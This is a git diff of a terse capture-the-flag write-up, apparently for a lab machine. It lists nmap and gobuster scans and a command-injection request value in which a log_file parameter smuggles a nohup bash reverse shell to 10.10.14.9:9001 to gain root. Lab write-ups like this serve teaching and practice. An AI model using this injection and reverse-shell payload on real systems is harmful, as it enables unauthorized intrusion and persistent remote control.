@@ -16,11 +16,7 @@ Login to the remote machine on the browser using the proxy. Catch the request fr
 </body>
 </details>
 
-#### Not quite a Bordereau
-
-I had the commands and information saved before I started thinking about posting these on github. In the future there is more detail, but when I did this, it was more of a brain dump and less of a conscious effort to provide a detailed writeup.
-
-## Steps
+## Writeup
 
 Scan the machine for open ports
 `nmap --open -p- -oA nmap/open <IP>`
@@ -29,6 +25,7 @@ Use gobuster to find files on the webserver
 `gobuster dir -u http://10.129.194.230:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
 
 Find a registration page on the machine
+![alt text](images/image9.png)
 
 Find the apache server on `http://10.129.194.230:50000/etc/apache2
 
@@ -104,7 +101,7 @@ Try to run a command
   - URL encode with Ctrl + U
 
 Use nohup -> shells persist after the terminal closes  
- • `log_file=root/root.txt;bash+-c+'nohup+bash+-i+>%26/dev/tcp/10.10.14.9/9001+0>%261+%26';#&analyze_log=`  
+`log_file=root/root.txt;bash+-c+'nohup+bash+-i+>%26/dev/tcp/10.10.14.9/9001+0>%261+%26';#&analyze_log=`  
 Get root access
 
 ![alt text](images/image-4.png)
